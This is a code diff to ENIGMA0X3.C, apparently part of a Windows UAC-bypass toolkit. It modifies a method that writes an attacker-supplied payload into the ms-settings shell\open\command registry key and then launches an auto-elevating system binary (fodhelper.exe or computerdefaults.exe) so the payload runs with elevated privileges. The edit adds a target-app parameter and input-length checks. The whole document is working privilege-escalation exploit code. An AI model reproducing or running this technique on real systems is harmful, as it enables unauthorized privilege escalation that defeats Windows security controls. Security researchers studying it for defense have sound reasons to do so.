@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     3.25
+*  VERSION:     3.26
 *
-*  DATE:        05 May 2020
+*  DATE:        23 May 2020
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -567,7 +567,8 @@ NTSTATUS ucmSdcltIsolatedCommandMethod(
 *
 */
 NTSTATUS ucmMsSettingsDelegateExecuteMethod(
-    _In_ LPWSTR lpszPayload
+    _In_ LPWSTR lpszPayload,
+    _In_ LPWSTR lpszTargetApp //max 260
 )
 {
     NTSTATUS  MethodResult = STATUS_ACCESS_DENIED;
@@ -577,9 +578,8 @@ NTSTATUS ucmMsSettingsDelegateExecuteMethod(
 #endif
 
     DWORD   cbData;
-    SIZE_T  sz = 0;
+    SIZE_T  payloadSize = 0, inLength;
     LRESULT lResult;
-    LPWSTR lpTargetApp = NULL;
     HKEY    hKey = NULL;
 
     WCHAR szTempBuffer[MAX_PATH * 2];
@@ -597,7 +597,13 @@ NTSTATUS ucmMsSettingsDelegateExecuteMethod(
 
     do {
 
-        sz = _strlen(lpszPayload);
+        payloadSize = _strlen(lpszPayload);
+        if (payloadSize == 0)
+            return MethodResult;
+
+        inLength = _strlen(lpszTargetApp);
+        if ((inLength >= MAX_PATH) || (inLength == 0))
+            return MethodResult;
 
         _strcpy(szTempBuffer, T_MSSETTINGS);
         _strcat(szTempBuffer, T_SHELL_OPEN_COMMAND);
@@ -625,7 +631,7 @@ NTSTATUS ucmMsSettingsDelegateExecuteMethod(
         //
         // Set "Default" value as our payload.
         //
-        cbData = (DWORD)((1 + sz) * sizeof(WCHAR));
+        cbData = (DWORD)((1 + payloadSize) * sizeof(WCHAR));
 
         lResult = RegSetValueEx(
             hKey,
@@ -635,21 +641,9 @@ NTSTATUS ucmMsSettingsDelegateExecuteMethod(
             cbData);
 
         if (lResult == ERROR_SUCCESS) {
+
             _strcpy(szTempBuffer, g_ctx->szSystemDirectory);
-
-            //
-            // Not because it was fixed but because this was added in RS4 _additionaly_
-            //
-            lpTargetApp = FODHELPER_EXE;
-
-            if (g_ctx->dwBuildNumber > 16299) {
-
-                if (IDYES == ucmShowQuestion(T_PICK_EXE_QUESTION)) {
-                    lpTargetApp = COMPUTERDEFAULTS_EXE;
-                }
-            }
-
-            _strcat(szTempBuffer, lpTargetApp);
+            _strcat(szTempBuffer, lpszTargetApp);
 
             if (supRunProcess(szTempBuffer, NULL))
                 MethodResult = STATUS_SUCCESS;
